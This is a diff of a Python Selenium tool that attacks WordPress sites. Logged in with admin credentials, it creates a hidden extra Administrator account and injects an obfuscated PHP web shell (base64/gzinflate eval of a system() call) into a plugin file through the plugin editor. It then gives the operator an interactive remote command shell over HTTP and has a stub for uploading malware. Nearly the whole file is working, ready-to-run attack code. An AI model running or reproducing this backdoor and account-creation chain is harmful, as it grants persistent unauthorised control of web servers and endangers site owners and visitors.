@@ -1,26 +1,47 @@
 #!/usr/bin/python3
-
 from selenium import webdriver
-#from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.select import Select
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+from selenium.common.exceptions import TimeoutException
 from bs4 import BeautifulSoup
 import urllib.parse
-import argparse, logging, sys, time
+import argparse, logging, sys
 
 FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
 P_BACKUP:str
 
+# wait until the element os loaded on the page
+def load_element(e_name, e_type='ID', timeout=5):
+    try: 
+        if e_type == 'ID':
+            element_present = EC.presence_of_element_located((By.ID, e_name))
+        elif e_type == 'NAME':
+            element_present = EC.presence_of_element_located((By.NAME, e_name))
+        elif e_type == 'CLASS':
+            element_present = EC.presence_of_element_located((By.CLASS_NAME, e_name))
+        WebDriverWait(driver, timeout).until(element_present)
+    except TimeoutException:
+        print(f"Timed out waiting for page to load by element[{e_type}] {e_name}")
+        exit(-1)
+
+# Login with username and password
 def login(user, password):
     logging.info(f'Login with user: {user}')
     try:
         driver.get(args.url+'/wp-login.php')
-        driver.find_element_by_name('log').clear()
-        driver.find_element_by_name('pwd').clear()
-        time.sleep(1)
-        driver.find_element_by_name('log').send_keys(user)
-        driver.find_element_by_name('pwd').send_keys(password)
-        time.sleep(1)
-        driver.find_element_by_name('wp-submit').click()
+        # clear and write to username field
+        load_element('user_login')
+        driver.find_element_by_id('user_login').clear()
+        driver.find_element_by_id('user_login').send_keys(user)
+        # clear and write to password field
+        load_element('user_pass')
+        driver.find_element_by_id('user_pass').clear()
+        driver.find_element_by_id('user_pass').send_keys(password)
+        # click login button
+        load_element('wp-submit')
+        driver.find_element_by_id('wp-submit').click()
         if 'Error' in driver.page_source:
             print("Invalider Login")
             exit(-1)
@@ -28,84 +49,108 @@ def login(user, password):
         print(f'Login Failed : {e}')
         exit(-1)
 
+# Create new admin user
 def crate_user():
     logging.info(f'Crate User {args.newUser}')
     try:
         if 'users.php' not in driver.page_source:
             print('Current User have no Administartion rights')
             exit(-1)
+        load_element('adminmenuwrap') # load menu
+        # go to "add new user" page
         driver.find_element_by_xpath("//a[@href ='users.php']").click()
         driver.find_element_by_xpath("//a[@href ='user-new.php']").click() 
-        time.sleep(1)
         logging.info(f'Current Url: {driver.current_url}')
         logging.info('Create User')
-        # set user data
+        # write user data in fields
+        load_element('user_login')
         driver.find_element_by_id('user_login').send_keys('sele')
+        load_element('email')
         driver.find_element_by_id('email').send_keys('sele@example.de')
+        load_element('pass1')
         driver.find_element_by_id('pass1').clear()
         driver.find_element_by_id('pass1').send_keys('pw123')
-        time.sleep(1)
+        # select password is weak
+        load_element('pw_weak', 'NAME')
         driver.find_element_by_name('pw_weak').click()
+        # select role admin
+        load_element('role')
         driver.find_element_by_id('role').send_keys('Administrator')
+        # click create user button 
+        load_element('createusersub')
         driver.find_element_by_id('createusersub').click()
     except Exception as e:
         print(f'Crate User Failed : {e}')
         exit(-1)
 
+# write php backdoor to the plugin file
 def write_payload(c_p_name, f_name):
     global P_BACKUP
     logging.info(f'Write Payload in Plugin:{c_p_name} with File:{f_name}')
-    payload = "<?php system($_REQUEST['cmd']); ?>"
+    # orginal php backdoor "<?php system($_REQUEST[0]); ?>"
+    payload = "<?php eval(gzinflate(base64_decode('K64sLknN1VCJD3INDHUNDok2iNW0BgA='))); ?>"
     try:
-        P_BACKUP = driver.find_element_by_id("newcontent").get_attribute('value')
+        # save orginal plugin code for cleanup
+        load_element('newcontent')
+        P_BACKUP = driver.find_element_by_id('newcontent').get_attribute('value')
+        # check if backdoor exists already
         if payload not in P_BACKUP:
-            codeMirror = driver.find_element_by_class_name("CodeMirror")
+            load_element('CodeMirror', 'CLASS')
+            codeMirror = driver.find_element_by_class_name('CodeMirror')
+            # inject payload at the start of the script
             driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, payload+P_BACKUP)
         else:
+            # save orginal plugin code for cleanup
+            logging.info('Backdoor exist already')
             P_BACKUP = P_BACKUP.replace(payload,"")
     except Exception as e:
         print(f'Write Payload Failed : {e}')
         exit(-1)
-    time.sleep(3)
 
+# remove backdoor from plugin file
 def cleanup():
     logging.info('Start Cleanup')
     try:
         driver.get(EDIT_PLUGIN_URL)
-        time.sleep(1)
+        # overwrite backdoor with orginal plugin code
+        load_element('CodeMirror', 'CLASS')
         codeMirror = driver.find_element_by_class_name("CodeMirror")
         driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, P_BACKUP)
-        time.sleep(1)
-        time.sleep(2)
+        load_element('submit')
         driver.find_element_by_xpath("//input[@value='Update File']").click()
+        load_element('notice-success','CLASS',20) # wait "File edited successfully."
     except Exception as e:
         print(f'Cleanup Failed : {e}')
         exit(-1)
-    time.sleep(3)
 
+# locate all plugins and choose one to inject the php backdoor
 def edit_plugin():
     global EDIT_PLUGIN_URL
     logging.info('Start Edit Plugin')
     try:
+        load_element('adminmenuwrap') # load menu
         driver.find_element_by_xpath("//a[@href ='tools.php']").click()
+        # check if user can edit plugins (default config: only admin have the rights)
         if 'plugin-editor.php' not in driver.page_source:
                 print('Current User have no Administartion rights')
                 exit(-1)
         driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
-        time.sleep(1)
-        try: # Click warning window
+        # Click on warning window
+        try:
             driver.find_element_by_class_name('file-editor-warning-dismiss').click()
         except:
             pass
-        time.sleep(1)
-        p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']")) # Get all plugins
+        load_element('plugin')
+        p_all = Select(driver.find_element_by_id('plugin')) # Get all plugins
+        # check plugin selection
         if len(p_all.options) == 0:
             print('There are no Plugins available')
             exit(-1)
+        # ask for plugin name for php backdoor injection
         print("\n| Choose Plugin for Backdoor")
         while True:
             for p in p_all.options:
-                print(f'[{p_all.options.index(p)}] - {p.text}')
+                print(f'\t - [{p_all.options.index(p)}] {p.text}')
             num = input('Plugin Nummber: ')
             if num.isdigit() and int(num) >=0 and int(num) < len(p_all.options):
                 break
@@ -113,21 +158,27 @@ def edit_plugin():
                 print('Wrong Input: Choose a Plugin Nummber')
         c_p_name = p_all.options[int(num)].text
         driver.find_element_by_id('plugin').send_keys(c_p_name)
+        # click plugin select button
+        load_element('submit')
         driver.find_element_by_xpath("//input[@value='Select']").click()
         url_edit = urllib.parse.unquote(driver.current_url)
+        print(url_edit)
+        # get plugin name and file name 
         pf_name = url_edit.split('=')[-2].split('&')[0]
         p_name = pf_name.split('/')[0]
         f_name = pf_name.split('/')[1]
         logging.info(f'Current Url: {url_edit}')
         EDIT_PLUGIN_URL = driver.current_url
         write_payload(p_name, f_name)
-        time.sleep(1)
+        # click save edit plugin 
         driver.find_element_by_xpath("//input[@value='Update File']").click()
+        load_element('notice-success','CLASS',20) # wait "File edited successfully."
     except Exception as e:
         print(f"Edit Plugin Fail : {e}")
         exit(-1)
     return p_name, f_name
 
+# check if plugin file exists and working
 def check_backdoor(p_name, f_name):
     logging.info('Check Backdoor')
     try:
@@ -141,60 +192,64 @@ def check_backdoor(p_name, f_name):
         exit(-1)
     logging.info("Backdoor Online")    
     
+def upload_malware():
+    pass
+
+# execute remote commands via http request
 def cmd():
-    backdoor_url = driver.current_url
+    backdoor_url = driver.current_url # URL where the backdoor is located
     logging.info(f'Execute code at: {backdoor_url}')
-    try:
-        while True:
+    # wait for user input
+    while True:
+        try:
             cmd = input("$ ")
-            if cmd.lower() == 'exit':
+            if cmd.lower() == 'exit': # exit script
                 driver.quit()
                 exit()
-            elif cmd.lower() == 'cleanup':
+            elif cmd.lower() == 'cleanup': # start cleanup
                 cleanup()
                 break
-            else:
-                driver.get(f'{backdoor_url}?cmd={cmd}')
-                cleantext = BeautifulSoup(driver.page_source, "lxml").text
-                if not 'wordpress is currently unable to handle this request' in cleantext:
+            elif 'uplad' in cmd.lower(): # upload malware to target server
+                upload_malware()
+            else: # send os command
+                driver.get(f'{backdoor_url}?0={cmd}')
+                cleantext = BeautifulSoup(driver.page_source, "lxml").text # remove html code from command output
+                if 'HTTP ERROR 500' not in cleantext:
                     print(cleantext)
-    except Exception as e:
-        print(f'Comamnd Execution Failed : {e}')
-        exit(-1)
+        except KeyboardInterrupt:
+            exit()
+        except Exception as e:
+            print(f'Comamnd Execution ERROR : {e}')
 
 def main():
     print("\n| Start Selenium Script")
     login(args.user, args.password)
-    time.sleep(1)
+    # Crate new admin user
     if not args.skipCreate:    
         crate_user()
-        time.sleep(1)
         login(args.newUser,args.newPassword)
-        time.sleep(1)
+    # Inject php backdoor in plugin
     if not args.skipBackdoor:
         p_name, f_name = edit_plugin()
-        time.sleep(1)
         check_backdoor(p_name, f_name)
         cmd()
-    time.sleep(2)
     driver.get(args.url+'/wp-admin/index.php')
     print("\n| End")
-    exit()
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description = 'Selenium script that create a second User with Administrator role and place a backdoor in a plugin file for command execution')
+    parser = argparse.ArgumentParser(description = 'Selenium script that create a second User with Administrator role and place a php backdoor in a plugin file for remote command execution')
     parser.add_argument('--url', required=True, type=str, help='Target Wordpress Url')
-    parser.add_argument('-U', '--user', required=True, type=str, help='User Name')
-    parser.add_argument('-P', '--password', required=True, type=str, help='User Password')
+    parser.add_argument('-U', '--user', required=True, type=str, help='Admin Username')
+    parser.add_argument('-P', '--password', required=True, type=str, help='Admin Password')
     parser.add_argument('-d', '--driver', required=True, help='Path to the chromedriver')
-    parser.add_argument('-nU', '--newUser', nargs='?', default='sele', type=str, help='New User Name')
-    parser.add_argument('-nP', '--newPassword', nargs='?', default='pw123', type=str, help='New User Password')
-    parser.add_argument('-sC', '--skipCreate', action=argparse.BooleanOptionalAction, default=False, help='Dont create user with administrator role')
-    parser.add_argument('-sB', '--skipBackdoor', action=argparse.BooleanOptionalAction, default=False, help='Dont crate backdoor')
+    parser.add_argument('-nU', '--newUser', nargs='?', default='sele', type=str, help='New User: Usename (Default: sele)')
+    parser.add_argument('-nP', '--newPassword', nargs='?', default='pw123', type=str, help='New User: Password (Default: pw123)')
+    parser.add_argument('-sC', '--skipCreate', action=argparse.BooleanOptionalAction, default=False, help='Dont create new admin user')
+    parser.add_argument('-sB', '--skipBackdoor', action=argparse.BooleanOptionalAction, default=False, help='Dont inject php backdoor in plugin code')
     parser.add_argument('-H', '--headless', action=argparse.BooleanOptionalAction, default=False, help='Set ChromeOption headless for no window')
     parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
     args = parser.parse_args()
-    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
+
     args.url = args.url.rstrip('/')
     options = None
     if args.headless:
@@ -205,6 +260,8 @@ if __name__ == '__main__':
         options.add_argument("disable-gpu")
     driver = webdriver.Chrome(args.driver, chrome_options=options)
     driver.set_window_size(1100,900)
+
+    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
     main()
 
 
